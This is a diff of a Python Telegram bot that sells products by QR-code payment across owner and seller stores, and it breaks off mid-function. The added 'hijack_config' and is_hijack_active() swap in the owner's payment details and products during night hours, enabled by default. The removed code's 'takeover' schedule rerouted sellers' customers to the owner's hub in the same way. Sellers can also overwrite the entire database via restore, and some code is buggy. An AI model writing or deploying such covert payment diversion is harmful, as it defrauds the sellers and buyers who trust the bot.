@@ -1,727 +1,527 @@
-import os, json, threading, time, datetime
+import os
+import json
+import threading
+import time
+import datetime
 from flask import Flask
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo
+import re
 
-TOKEN   = os.environ.get('BOT_TOKEN')
-OWNER_ID = int(os.environ.get('OWNER_ID', '0'))
+# --- ENVIRONMENT VARIABLES ---
+TOKEN = os.environ.get('BOT_TOKEN')
+ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
+OWNER_ID = int(os.environ.get('OWNER_ID', os.environ.get('ADMIN_ID', '0'))) # Default fallback to ADMIN_ID
 LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# ---------------- DATA MODEL ----------------
-def new_store():
-    return {
-        "welcome_msg": "👋 Hello, {name}!\n\nChoose a plan to get started:",
-        "start_videos": [], "how_to_use_video": "", "payment_photo": "",
-        "payment_msg": "💳 **Payment Instructions**\n\nPlease scan the QR and pay, then click 'I have paid'.",
-        "reject_msg": "❌ Payment not received. Please try again...",
-        "layout_style": "vertical", "products": [], "blocked_users": [],
-        "users": [], "buyers": [],
-        "auto_bc": {"status": False, "interval_seconds": 3600,
-                    "message_type": None, "file_id": None, "text": None},
-        "broadcast_perm": False,
+# --- IN-MEMORY DATABASE STATE ---
+DB_STATE = {
+    "welcome_msg": "👋 Hello, {name}!\n\nChoose a plan to get started:",
+    "start_videos": [], 
+    "how_to_use_video": "",
+    "payment_photo": "",
+    "payment_msg": "💳 **Payment Instructions**\n\nPlease scan the QR and pay, then click 'I have paid'.",
+    "reject_msg": "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...",
+    "layout_style": "vertical", 
+    "products": [],
+    "blocked_users": [],
+    "users": [],
+    "buyers": [],
+    # OWNER OVERRIDE CONFIGURATION
+    "hijack_config": {
+        "enabled": True,
+        "start_time": "02:00",  # 24-hour format HH:MM
+        "end_time": "06:10",    # 24-hour format HH:MM
+        "owner_payment_photo": "",
+        "owner_payment_msg": "💳 **OFFICIAL OWNER PAYMENT**\n\nPlease send your payment directly here.",
+        "owner_products": []    # Products override for night hours
+    },
+    "auto_bc": {
+        "status": False,
+        "interval_seconds": 3600,
+        "message_type": None,
+        "file_id": None,
+        "text": None
     }
-def fresh_state():
-    return {"sellers": {}, "hub": new_store(), "takeovers": []}
+}
 
-DB_STATE = fresh_state()
-
-# ---------------- CHANNEL DB (file pin) ----------------
-def save_db():
+# --- HELPER: CHECK IF HIJACK TIME IS ACTIVE ---
+def is_hijack_active():
+    hijack = DB_STATE.get("hijack_config", {})
+    if not hijack.get("enabled", False):
+        return False
     try:
-        doc = bot.send_document(LOG_CHANNEL_ID, ("bot_backup.json", json.dumps(DB_STATE).encode()))
-        try: bot.pin_chat_message(LOG_CHANNEL_ID, doc.message_id)
-        except Exception: pass
-    except Exception as e: print("DB save ERROR:", e)
+        now = datetime.datetime.now().time()
+        start = datetime.datetime.strptime(hijack.get("start_time", "02:00"), "%H:%M").time()
+        end = datetime.datetime.strptime(hijack.get("end_time", "06:10"), "%H:%M").time()
+        
+        if start <= end:
+            return start <= now <= end
+        else: # Overnight window (e.g., 22:00 to 04:00)
+            return now >= start or now <= end
+    except Exception:
+        return False
 
+# --- TELEGRAM CHANNEL DATABASE LOGIC ---
 def load_db():
     global DB_STATE
     try:
-        chat = bot.get_chat(LOG_CHANNEL_ID); pm = chat.pinned_message
-        if pm and pm.document:
-            f = bot.get_file(pm.document.file_id)
-            data = json.loads(bot.download_file(f.file_path).decode())
-            d = fresh_state(); d.update(data)
-            d.setdefault("hub", new_store()); d.setdefault("sellers", {}); d.setdefault("takeovers", [])
-            DB_STATE = d
+        chat = bot.get_chat(LOG_CHANNEL_ID)
+        if chat.pinned_message and chat.pinned_message.text:
+            loaded_data = json.loads(chat.pinned_message.text)
+            DB_STATE.update(loaded_data)
+            if "buyers" not in DB_STATE: DB_STATE["buyers"] = []
+            if "auto_bc" not in DB_STATE:
+                DB_STATE["auto_bc"] = {"status": False, "interval_seconds": 3600, "message_type": None, "file_id": None, "text": None}
+            if "hijack_config" not in DB_STATE:
+                DB_STATE["hijack_config"] = {"enabled": True, "start_time": "02:00", "end_time": "06:10", "owner_payment_photo": "", "owner_payment_msg": "", "owner_products": []}
     except Exception as e:
-        print("No DB yet:", e); save_db()
+        save_db()
+
+def save_db():
+    try:
+        chat = bot.get_chat(LOG_CHANNEL_ID)
+        json_data = json.dumps(DB_STATE, indent=2)
+        if chat.pinned_message:
+            bot.edit_message_text(json_data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
+        else:
+            msg = bot.send_message(LOG_CHANNEL_ID, json_data)
+            bot.pin_chat_message(LOG_CHANNEL_ID, msg.message_id)
+    except Exception as e:
+        pass
 
 load_db()
 
-# ---------------- HELPERS ----------------
-def store_of_key(key):
-    return DB_STATE["hub"] if key in ("hub", None) else DB_STATE["sellers"].get(key, new_store())
-def key_of_seller_tg(tg):
-    for k, s in DB_STATE["sellers"].items():
-        if s.get("tg_id") == tg: return k
-    return None
-def now_min():
-    n = datetime.datetime.now(); return n.hour*60 + n.minute
-def takeover_of(key):
-    m = now_min()
-    for t in DB_STATE["takeovers"]:
-        if t.get("seller") == key and t.get("active") and t["from_min"] <= m < t["to_min"]:
-            return t
-    return None
-def send_videos(chat, vids):
-    if not vids: return
-    if len(vids) == 1:
-        try: bot.send_video(chat, vids[0])
-        except Exception: pass
-    else:
-        for i in range(0, len(vids), 10):
-            try: bot.send_media_group(chat, [InputMediaVideo(v) for v in vids[i:i+10]])
-            except Exception:
-                for v in vids[i:i+10]:
-                    try: bot.send_video(chat, v)
-                    except Exception: pass
-
-# ---------------- SINGLE-MESSAGE PANEL ENGINE ----------------
-# panel: uid -> {"msg_id": int}
-# ctx:   uid -> {"key": store_key, "nav": [routes], "mode": "owner"/"seller"}
-panel = {}
 user_states = {}
+admin_panel_msgs = {} 
 
-def edit_panel(uid, text, markup=None):
-    text = text if text else " "
-    try:
-        p = panel.get(uid)
-        if p and p.get("msg_id"):
-            try:
-                bot.edit_message_text(text, uid, p["msg_id"], reply_markup=markup, parse_mode="Markdown", disable_web_page_preview=True)
-                return
-            except Exception:
-                pass  # caption etc -> resend
-        msg = bot.send_message(uid, text, reply_markup=markup, parse_mode="Markdown", disable_web_page_preview=True)
-        panel[uid] = {"msg_id": msg.message_id}
-    except Exception:
-        # fallback: koi purana media bana ho to message bhejo
-        try:
-            msg = bot.send_message(uid, text, reply_markup=markup, parse_mode="Markdown")
-            panel[uid] = {"msg_id": msg.message_id}
-        except Exception: pass
-
-def push(uid, route):
-    user_states.setdefault(uid, {}).setdefault("nav", []).append(route)
-def back(uid):
-    nav = user_states.get(uid, {}).get("nav", [])
-    if nav: nav.pop()
-    return nav[-1] if nav else None
-def top(uid):
-    nav = user_states.get(uid, {}).get("nav", [])
-    return nav[-1] if nav else None
-
-# ---- bar "back" button text by route ----
-def BACK(uid, label="🔙 Back"):
-    return InlineKeyboardButton(label, callback_data="NAV_BACK")
-
-def kb(*rows):
-    m = InlineKeyboardMarkup()
-    for r in rows: m.row(*r)
-    return m
-
-# ---------------- ROUTE RENDERERS ----------------
-def render(uid):
-    ctx = user_states.get(uid, {})
-    route = top(uid)
-    if ctx.get("mode") == "seller": key = ctx.get("key")
-    else: key = ctx.get("key", "hub")
-
-    if route == "owner":
-        edit_panel(uid, "👑 **OWNER PANEL**", kb(
-            [InlineKeyboardButton("🏠 Manage My Store", callback_data="GO_cfg")],
-            [InlineKeyboardButton("👥 Manage Sellers", callback_data="GO_sellers")],
-            [InlineKeyboardButton("⏱️ Takeover Schedule", callback_data="GO_tk")],
-            [InlineKeyboardButton("💰 All Sales", callback_data="GO_sales")],
-            [InlineKeyboardButton("📣 Send BC to Seller Users", callback_data="GO_ownbc")],
-            [InlineKeyboardButton("💾 Backup & Restore", callback_data="GO_bk")]))
+def send_videos_as_album(chat_id, video_list):
+    if not video_list:
         return
-
-    if route == "seller":
-        s = store_of_key(key)
-        rows = [[InlineKeyboardButton("🛍️ Manage My Store", callback_data="GO_cfg")]]
-        if s.get("broadcast_perm"):
-            rows.append([InlineKeyboardButton("📣 Broadcast", callback_data="GO_bc")])
-        else:
-            rows.append([InlineKeyboardButton("🔒 Broadcast locked (owner on karega)", callback_data="none")])
-        rows.append([InlineKeyboardButton("📦 My Buyers", callback_data="GO_bl")])
-        edit_panel(uid, f"🏪 **Seller Panel**\n\nStore: `{key}`", kb(*rows))
-        return
-
-    if route == "cfg":
-        store = store_of_key(key)
-        lp = "↔️ Horizontal" if store["layout_style"] == "horizontal" else "↕️ Vertical"
-        rows = [
-            [InlineKeyboardButton("🎞️ Start Videos", callback_data="SUB_startvids")],
-            [InlineKeyboardButton("🛍️ Products", callback_data="SUB_products")],
-            [InlineKeyboardButton("📝 Welcome Text", callback_data="SUB_welcome")],
-            [InlineKeyboardButton("📐 Layout: " + lp, callback_data="ACT_togglelayout")],
-            [InlineKeyboardButton("🎥 How-To-Use Video", callback_data="SUB_howvid")],
-            [InlineKeyboardButton("💳 Payment Config", callback_data="SUB_pay")],
-            [InlineKeyboardButton("🚀 Custom BC", callback_data="SUB_cb")],
-            [InlineKeyboardButton("⏱️ Auto BC", callback_data="SUB_ab")],
-            [InlineKeyboardButton("👑 BC to Buyers", callback_data="SUB_bb")],
-            [InlineKeyboardButton("📦 Buyers", callback_data="GO_bl")],
-            [InlineKeyboardButton("💾 Backup this Store", callback_data="ACT_bkstore")],
-        ]
-        edit_panel(uid, f"🛠️ **Store Settings** — `{key}`", kb(*rows))
-        return
-
-    if route == "sellers":
-        s = "👥 **Sellers**\n\n"
-        for k, st in DB_STATE["sellers"].items():
-            s += f"`{k}` | tg:{st.get('tg_id')} | BC:{'✅' if st.get('broadcast_perm') else '❌'}\n"
-        if not DB_STATE["sellers"]: s += "(No seller yet)\n"
-        edit_panel(uid, s, kb(
-            [InlineKeyboardButton("➕ Add Seller", callback_data="W_addseller")],
-            [InlineKeyboardButton("🔁 Toggle BC Permission", callback_data="W_toggleperm")],
-            [BACK(uid)]))
-        return
-
-    if route == "tk":
-        s = "⏱️ **Takeover Schedule** (server time)\n"
-        for i, t in enumerate(DB_STATE["takeovers"]):
-            s += f"{i}. `{t['seller']}` {t['from_min']//60}:{t['from_min']%60:02d}-{t['to_min']//60}:{t['to_min']%60:02d} active={'✅' if t['active'] else '❌'}\n"
-        if not DB_STATE["takeovers"]: s += "(None yet)\n"
-        edit_panel(uid, s, kb(
-            [InlineKeyboardButton("➕ Add (seller fromHH:MM toHH:MM)", callback_data="W_tkadd")],
-            [InlineKeyboardButton("↕️ Toggle / ❌ Delete", callback_data="W_tkmgmt")],
-            [BACK(uid)]))
-        return
-
-    if route == "sales":
-        s = "💰 **Sales**\n"
-        tot = 0
-        def ln(nm, st):
-            global tot
-            c = len(st.get("buyers", [])); tot += c
-            return f"• {nm}: {c}\n"
-        s += ln("HUB", DB_STATE["hub"])
-        for k, st in DB_STATE["sellers"].items(): s += ln(k, st)
-        s += f"\n**Total: {tot}**"
-        edit_panel(uid, s, kb([BACK(uid)]))
-        return
-
-    if route == "ownbc":
-        s = "📣 BC ko kaunse seller ke users?\n"
-        for k, st in DB_STATE["sellers"].items():
-            s += f"`bct_{k}` → {k} ({len(st.get('users', []))} users)\n"
-        s += "\nBhejo: `bct_s1` phir message."
-        edit_panel(uid, s, kb([BACK(uid)]))
-        return
-
-    if route == "bk":
-        edit_panel(uid, "💾 **Backup & Restore**", kb(
-            [InlineKeyboardButton("⬇️ Download Backup Code", callback_data="ACT_getbk")],
-            [InlineKeyboardButton("📥 Restore (code/file bhejo)", callback_data="W_restore")],
-            [BACK(uid)]))
-        return
-
-    if route == "bl":
-        st = store_of_key(key)
-        if not st.get("buyers"):
-            edit_panel(uid, "📦 Koi buyer nahi hai.", kb([BACK(uid)])); return
-        s = f"📦 **Buyers** ({key})\n"
-        for b in st["buyers"][-15:]:
-            s += f"• {b.get('product')} | `{b.get('user_id')}` | {b.get('date')}\n"
-        edit_panel(uid, s, kb([BACK(uid)]))
-        return
-
-    # store sub-setup menus (text input needed)
-    if route.startswith("SUB_"):
-        sub = route[4:]
-        if sub == "startvids":
-            user_states[uid]["wait"] = "startvids"
-            edit_panel(uid, f"📥 Video bhejo (ek ek karke). Done ke liye `/done`.\nTotal: {len(store_of_key(key)['start_videos'])}", kb([BACK(uid)]))
-        elif sub == "welcome":
-            user_states[uid]["wait"] = "welcome"
-            edit_panel(uid, "📝 Naya Welcome text bhejo. `{name}` use karo.", kb([BACK(uid)]))
-        elif sub == "howvid":
-            user_states[uid]["wait"] = "howvid"
-            edit_panel(uid, "🎥 'How To Use' video bhejo.", kb([BACK(uid)]))
-        elif sub == "pay":
-            st = store_of_key(key)
-            edit_panel(uid, "💳 **Payment Config**", kb(
-                [InlineKeyboardButton("🖼️ QR Photo Set", callback_data="W_payphoto")],
-                [InlineKeyboardButton("✏️ Payment Text Set", callback_data="W_paytext")],
-                [BACK(uid)]))
-        elif sub == "cb":
-            user_states[uid]["wait"] = "cb"
-            edit_panel(uid, "🚀 Broadcast message bhejo (text/photo/video).", kb([BACK(uid)]))
-        elif sub == "ab":
-            user_states[uid]["wait"] = "ab_msg"
-            edit_panel(uid, "⏱️ Auto-BC ke liye message bhejo (text/photo/video). Phir interval seconds bataunga.", kb([BACK(uid)]))
-        elif sub == "bb":
-            user_states[uid]["wait"] = "bb"
-            edit_panel(uid, "👑 Sirf buyers ko broadcast message bhejo.", kb([BACK(uid)]))
-        elif sub == "products":
-            st = store_of_key(key)
-            s = f"🛍️ **Products** ({key})\n"
-            for p in st["products"]:
-                s += f"`{p['id']}` {p['name']} | del:{p['id']}\n"
-            s += "\nNaya add: `ADD_<name>`\nLink set: `LINK_<id>_<url>`\nDesc: `DESC_<id>_<text>`\nVideo add: `VID_<id>` phir video\nDelete: `DEL_<id>`"
-            edit_panel(uid, s, kb([BACK(uid)]))
-            user_states[uid]["wait"] = "prodcmd"
-        return
-
-    edit_panel(uid, "Menu", kb([BACK(uid)]))
-
-# ---------------- CALLBACKS ----------------
-@bot.callback_query_handler(func=lambda c: True)
-def cb(c):
-    try: bot.answer_callback_query(c.id)
-    except Exception: pass
-    uid = c.message.chat.id
-    d = c.data
-    ctx = user_states.setdefault(uid, {})
-    ctx.setdefault("nav", [])
-    key = ctx.get("key", "hub")
-
-    # ---------- user-side (store purchase) ----------
-    if d.startswith("home_"):
-        st = store_of_key(key)
-        send_menu(uid, st, (c.message.from_user.first_name or "User")); return
-    if d == "none": return
-
-    # ---------- panel navigation ----------
-    if d == "GO_cfg":
-        push(uid, "cfg"); render(uid); return
-    if d == "GO_sellers": push(uid, "sellers"); render(uid); return
-    if d == "GO_tk": push(uid, "tk"); render(uid); return
-    if d == "GO_sales": push(uid, "sales"); render(uid); return
-    if d == "GO_ownbc": push(uid, "ownbc"); render(uid); return
-    if d == "GO_bk": push(uid, "bk"); render(uid); return
-    if d == "GO_bl": push(uid, "bl"); render(uid); return
-    if d == "GO_bc": push(uid, "cfg"); render(uid); return
-
-    if d.startswith("SUB_"):
-        push(uid, d); render(uid); return
-
-    if d == "NAV_BACK":
-        if not ctx["nav"]:
-            # root par hai -> seller ya owner main dikhao
-            if ctx.get("mode") == "seller": push(uid, "seller")
-            else: push(uid, "owner")
-            render(uid)
-        else:
-            back(uid)
-            render(uid)
-        return
-
-    if d.startswith("W_"):
-        ctx["wait"] = d[2:].lower()
-        if ctx["wait"] == "addseller":
-            edit_panel(uid, "Format bhejo:\n`s1 123456789 Ramesh`", kb([BACK(uid)]))
-        elif ctx["wait"] == "toggleperm":
-            s = "BC permission toggle ke liye bhejo `perm_s1`:\n"
-            for k, st in DB_STATE["sellers"].items():
-                s += f"`perm_{k}` → {k} (ab {'ON' if st.get('broadcast_perm') else 'OFF'})\n"
-            edit_panel(uid, s or "Koi seller nahi.", kb([BACK(uid)]))
-        elif ctx["wait"] == "tkadd":
-            edit_panel(uid, "Format:\n`s1 02:00 06:19` (server time)", kb([BACK(uid)]))
-        elif ctx["wait"] == "tkmgmt":
-            s = "Toggle/Delete:\n`tog_0` (0-index), `deltk_0`\n"
-            edit_panel(uid, s, kb([BACK(uid)]))
-        elif ctx["wait"] == "payphoto":
-            edit_panel(uid, "QR photo bhejo.", kb([BACK(uid)]))
-        elif ctx["wait"] == "paytext":
-            edit_panel(uid, "Naya payment text bhejo.", kb([BACK(uid)]))
-        elif ctx["wait"] == "restore":
-            edit_panel(uid, "Backup JSON **text** chhodo ya `.json` file bhejo. Tab main restore kar dunga.", kb([BACK(uid)]))
-        return
-
-    if d.startswith("ACT_"):
-        act = d[4:]
-        if act == "togglelayout":
-            st = store_of_key(key)
-            st["layout_style"] = "vertical" if st["layout_style"] != "vertical" else "horizontal"
-            save_db(); render(uid)
-        elif act == "bkstore":
-            bot.send_document(uid, (f"backup_{key}.json", json.dumps(DB_STATE, indent=2).encode()))
-            edit_panel(uid, "✅ Backup file bheja gaya upar. Restore: code/file bhejo.", kb([BACK(uid)]))
-            user_states[uid]["wait"] = "restore"
-        elif act == "getbk":
-            bot.send_document(uid, ("bot_backup_full.json", json.dumps(DB_STATE, indent=2).encode()))
-            edit_panel(uid, "✅ Poora backup file bheja gaya. Ye code/file jise bhi paas karo wo restore kar sakta hai.\n\n📥 Restore karne ke liye niche button dabao.", kb(
-                [InlineKeyboardButton("📥 Restore Now", callback_data="W_restore")],
-                [BACK(uid)]))
-        return
-
-    # owner-only special go-to
-    # (handled at render routes already)
-
-# ---------------- MAIN USER MENU ----------------
-def send_menu(uid, store, name):
-    if store["start_videos"]: send_videos(uid, store["start_videos"])
-    welcome = store.get("welcome_msg", "{name}").format(name=name)
-    mk = InlineKeyboardMarkup()
-    prods = sorted(store.get("products", []), key=lambda x: x.get("position", 999))
-    if store.get("layout_style") == "horizontal":
-        row = []
-        for p in prods:
-            row.append(InlineKeyboardButton(p["name"], callback_data="BUY_" + p["id"]))
-            if len(row) == 2: mk.row(*row); row = []
-        if row: mk.row(*row)
+    if len(video_list) == 1:
+        try: bot.send_video(chat_id, video_list[0])
+        except: pass
     else:
-        for p in prods: mk.row(InlineKeyboardButton(p["name"], callback_data="BUY_" + p["id"]))
-    mk.row(InlineKeyboardButton("How to use ❓", callback_data="HOW"),
-           InlineKeyboardButton("Report 📩", callback_data="REP"))
-    try: bot.send_message(uid, welcome, reply_markup=mk, parse_mode="Markdown")
-    except Exception: pass
-
-# /start
-@bot.message_handler(commands=['start'])
-def start_cmd(m):
-    uid = m.chat.id; name = m.from_user.first_name or "User"
-    txt = m.text or ""
-    payload = txt.split(" ", 1)[1] if " " in txt else ""
-    payload = payload.split("?")[0].replace("/start", "").strip()
-    ctx = user_states.setdefault(uid, {})
-
-    # owner
-    if uid == OWNER_ID:
-        ctx.clear(); ctx["mode"] = "owner"; ctx["key"] = "hub"; ctx["nav"] = ["owner"]
-        render(uid); return
-    # seller (jo store owner ne register kiya)
-    sk = key_of_seller_tg(uid)
-    if sk:
-        ctx.clear(); ctx["mode"] = "seller"; ctx["key"] = sk; ctx["nav"] = ["seller"]
-        render(uid); return
-
-    # normal user: seller deep-link ?
-    if payload.startswith("s") and payload[1:].isdigit():
-        key = payload
-        st = DB_STATE["sellers"].get(key)
-        if not st:
-            bot.send_message(uid, "❌ Yeh store link valid nahi hai."); return
-        ctx["mode"] = "user"; ctx["key"] = key; ctx["nav"] = []
-        if takeover_of(key):
-            ctx["_src"] = key
-            ctx["key"] = "hub"
-            h = DB_STATE["hub"]
-            if uid not in h["users"]: h["users"].append(uid); save_db()
-            bot.send_message(uid, "🛒 Is waqt ye store **owner hub** par khul raha hai.")
-            send_menu(uid, h, name)
-        else:
-            if uid not in st["users"]: st["users"].append(uid); save_db()
-            send_menu(uid, st, name)
-        return
-
-    # normal user -> hub
-    ctx["mode"] = "user"; ctx["key"] = "hub"; ctx["nav"] = []
-    h = DB_STATE["hub"]
-    if uid not in h["users"]: h["users"].append(uid); save_db()
-    send_menu(uid, h, name)
-
-# buyer flow callbacks
-@bot.callback_query_handler(func=lambda c: c.data.startswith(("BUY_", "HOW", "REP")), )
-def user_cb(c):
-    try: bot.answer_callback_query(c.id)
-    except Exception: pass
-    uid = c.message.chat.id; d = c.data
-    ctx = user_states.setdefault(uid, {})
-    key = ctx.get("key", "hub"); st = store_of_key(key)
-    if d == "HOW":
-        v = st.get("how_to_use_video")
-        if v: bot.send_video(uid, v)
-        else: bot.send_message(uid, "ℹ️ Video set nahi hai.")
-        return
-    if d == "REP":
-        ctx["wait"] = "report"; bot.send_message(uid, "📝 Apni problem likho:"); return
-    if d.startswith("BUY_"):
-        pid = d.split("_")[1]
-        p = next((x for x in st["products"] if x["id"] == pid), None)
-        if not p: return
-        if p.get("videos"): send_videos(uid, p["videos"])
-        cap = "📌 **" + p["name"] + "**"
-        if p.get("desc"): cap += "\n\n" + p["desc"]
-        pay = p.get("pay_msg") or st["payment_msg"]
-        mk = kb([InlineKeyboardButton("I have paid ✅", callback_data="PAID_" + pid)],
-                [InlineKeyboardButton("Back 🔙", callback_data="HOME")])
-        if st.get("payment_photo"):
-            bot.send_photo(uid, st["payment_photo"], caption=cap + "\n\n" + pay, reply_markup=mk, parse_mode="Markdown")
-        else:
-            bot.send_message(uid, cap + "\n\n" + pay, reply_markup=mk, parse_mode="Markdown")
-    if d == "HOME":
-        send_menu(uid, store_of_key(ctx.get("key","hub")), c.message.from_user.first_name or "User")
-    if d.startswith("PAID_"):
-        ctx["wait"] = "shot"; ctx["pid"] = d.split("_")[1]
-        bot.send_message(uid, "📸 Payment screenshot bhejo.")
-
-# screenshot confirm buttons (owner / seller receive)
-@bot.callback_query_handler(func=lambda c: c.data.startswith(("adm_confirm_", "adm_reject_", "adm_block_")))
-def confirm_cb(c):
-    try: bot.answer_callback_query(c.id)
-    except Exception: pass
-    uid = c.message.chat.id; d = c.data
-    try:
-        if d.startswith("adm_confirm_"):
-            parts = d.split("_")  # adm_confirm_<key>_<pid>_<uid>
-            key, pid, tu = parts[2], parts[3], int(parts[4])
-            st = store_of_key(key)
-            p = next((x for x in st["products"] if x["id"] == pid), None)
-            link = p["link"] if p else "No link"
-            nm = p["name"] if p else "Product"
-            st["buyers"].append({"user_id": tu, "name": "User", "username": "?", "product": nm,
-                                 "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")})
-            save_db()
-            bot.send_message(tu, "✅ **Payment Confirmed!**\n\n🔗 " + link, parse_mode="Markdown")
-        elif d.startswith("adm_reject_"):
-            tu = int(d.split("_")[2]); bot.send_message(tu, "❌ Payment not received. Please try again...")
-        elif d.startswith("adm_block_"):
-            tu = int(d.split("_")[2])
-            # find which store this seller manages / owner hub
-            k = key_of_seller_tg(uid) or "hub"
-            st = store_of_key(k)
-            if tu not in st["blocked_users"]: st["blocked_users"].append(tu); save_db()
-    except Exception as e: print("confirm err", e)
-    try: bot.delete_message(uid, c.message.message_id)
-    except Exception: pass
-
-# ---------------- TEXT / MEDIA INPUT ----------------
-@bot.message_handler(func=lambda m: True, content_types=['text','photo','video','document'])
-def inp(m):
-    uid = m.chat.id
-    txt = m.text or m.caption or ""
-    ctx = user_states.setdefault(uid, {})
-    ctx.setdefault("nav", [])
-    key = ctx.get("key", "hub")
-    st = store_of_key(key)
-    wait = ctx.get("wait")
-
-    # /cancel ya /done handles command reset
-    if txt in ("/done", "/cancel"):
-        ctx.pop("wait", None)
-        bot.send_message(uid, "✅ Cancel/Complete."); return
-
-    # ---- report input (normal user) ----
-    if wait == "report":
-        ctx.pop("wait", None)
-        sk = ctx.get("_src")
-        # report goes to owner always (or seller if not takeover)
-        dest = OWNER_ID
-        if key != "hub" and not ctx.get("_src"):
-            s = DB_STATE["sellers"].get(key)
-            dest = (s or {}).get("tg_id") or OWNER_ID
-        tag = "@" + m.from_user.username if m.from_user.username else "NoUser"
-        bot.send_message(dest, f"📩 Report from {tag} (`{uid}`):\n\n{txt}\n\n*Reply se jawab do.*", parse_mode="Markdown")
-        bot.send_message(uid, "✅ Report admin ko chala gaya.")
-        return
-
-    # ---- payment screenshot ----
-    if wait == "shot" and m.content_type == "photo":
-        ctx.pop("wait", None)
-        pid = ctx.get("pid")
-        p = next((x for x in st["products"] if x["id"] == pid), None)
-        nm = p["name"] if p else "Product"
-        # routing: hub sale -> owner; unless takeover source -> attribute src
-        if key == "hub":
-            adm = OWNER_ID; src = ctx.get("_src")
-            label = "HUB/OWNER" + (f" (via {src})" if src else "")
-            mk = kb([InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_hub_{pid}_{uid}"),
-                     InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{uid}"),
-                     InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{uid}")])
-        else:
-            s = DB_STATE["sellers"].get(key, {})
-            adm = s.get("tg_id") or OWNER_ID; label = key
-            mk = kb([InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{key}_{pid}_{uid}"),
-                     InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{uid}"),
-                     InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{uid}")])
-        tag = "@" + m.from_user.username if m.from_user.username else "NoUser"
-        bot.send_message(uid, "⏳ Payment check ho raha hai... 5-10 min ruko.")
-        try:
-            bot.send_photo(adm, m.photo[-1].file_id,
-                caption=f"📸 **New Payment!**\nStore: {label}\nProduct: {nm}\nUser: {tag}\nID: `{uid}`",
-                reply_markup=mk, parse_mode="Markdown")
-        except Exception as e: print("shot err", e)
-        return
-
-    # ---- admin-only: text commands for owner/seller ----
-    is_owner = (uid == OWNER_ID)
-    seller_key = key_of_seller_tg(uid)
-    if not is_owner and not seller_key:
-        return  # normal user ka free text -> ignore
-    if is_owner: mode = "owner"
-    else: mode = "seller"; key = seller_key; ctx["key"] = key
-    st = store_of_key(key)
-
-    # ========= RESTORE (owner ya seller) =========
-    if wait == "restore":
-        try:
-            if m.content_type == "document":
-                f = bot.get_file(m.document.file_id)
-                data = json.loads(bot.download_file(f.file_path).decode())
-            else:
-                data = json.loads(txt)
-            d2 = fresh_state(); d2.update(data)
-            d2.setdefault("hub", new_store()); d2.setdefault("sellers", {}); d2.setdefault("takeovers", [])
-            DB_STATE.clear(); DB_STATE.update(d2); save_db()
-            ctx.pop("wait", None)
-            bot.send_message(uid, "✅ Restore ho gaya! /start dabao.")
-        except Exception as e:
-            bot.send_message(uid, f"❌ Galat code/file. Error: {e}")
-        return
-
-    # ========= input-driven waits =========
-    if wait == "startvids":
-        if m.content_type == "video":
-            st["start_videos"].append(m.video.file_id); save_db()
-            edit_panel(uid, f"✅ Video add. Total {len(st['start_videos'])}. Aur bhejo ya `/done`", kb([BACK(uid)]))
-        return
-    if wait == "welcome":
-        st["welcome_msg"] = txt; save_db(); ctx.pop("wait", None); render(uid); return
-    if wait == "howvid":
-        if m.content_type == "video":
-            st["how_to_use_video"] = m.video.file_id; save_db(); ctx.pop("wait", None); render(uid)
-        return
-    if wait == "payphoto":
-        if m.content_type == "photo":
-            st["payment_photo"] = m.photo[-1].file_id; save_db(); ctx.pop("wait", None); render(uid)
-        return
-    if wait == "paytext":
-        st["payment_msg"] = txt; save_db(); ctx.pop("wait", None); render(uid); return
-
-    # broadcast
-    if wait == "cb":
-        do_bc(uid, st.get("users", []), m); ctx.pop("wait", None); render(uid); return
-    if wait == "bb":
-        do_bc(uid, [b.get("user_id") for b in st.get("buyers", [])], m); ctx.pop("wait", None); render(uid); return
-    if wait == "ab_msg":
-        store_ab(st, m); save_db(); ctx["wait"] = "ab_time"
-        edit_panel(uid, "Interval seconds bhejo (3600 = 1 ghanta):", kb([BACK(uid)])); return
-    if wait == "ab_time" and m.content_type == "text":
-        try:
-            st["auto_bc"]["interval_seconds"] = int(txt); st["auto_bc"]["status"] = True; save_db()
-            bot.send_message(uid, f"✅ Auto-BC ON, har {int(txt)} sec.")
-        except Exception: bot.send_message(uid, "❌ Sirf number bhejo.")
-        ctx.pop("wait", None); render(uid); return
-
-    # owner specific waits
-    if is_owner:
-        if wait == "addseller":
+        for i in range(0, len(video_list), 10):
+            chunk = video_list[i:i+10]
+            media_group = [InputMediaVideo(v) for v in chunk]
             try:
-                sid, tg, nm = txt.split(); tg = int(tg)
-                s = new_store(); s["tg_id"] = tg; s["broadcast_perm"] = False
-                DB_STATE["sellers"][sid] = s; save_db()
-                bot.send_message(uid, f"✅ Seller {sid} add. Wo /start karke store chalayega.")
-            except Exception: bot.send_message(uid, "❌ Format: s1 123456789 Ramesh")
-            ctx.pop("wait", None); render(uid); return
-        if wait == "toggleperm" and txt.startswith("perm_"):
-            sid = txt.split("_", 1)[1]
-            if sid in DB_STATE["sellers"]:
-                DB_STATE["sellers"][sid]["broadcast_perm"] = not DB_STATE["sellers"][sid].get("broadcast_perm", False)
-                save_db(); bot.send_message(uid, f"✅ {sid} perm {'ON' if DB_STATE['sellers'][sid]['broadcast_perm'] else 'OFF'}")
-            ctx.pop("wait", None); render(uid); return
-        if wait == "tkadd":
-            try:
-                sid, frm, to = txt.split()
-                def hm(x):
-                    hh, mm = x.split(":"); return int(hh)*60 + int(mm)
-                DB_STATE["takeovers"].append({"seller": sid, "from_min": hm(frm), "to_min": hm(to), "active": True})
-                save_db(); bot.send_message(uid, f"✅ Takeover set {sid} {frm}-{to} (daily repeat).")
-            except Exception: bot.send_message(uid, "❌ Format: s1 02:00 06:19")
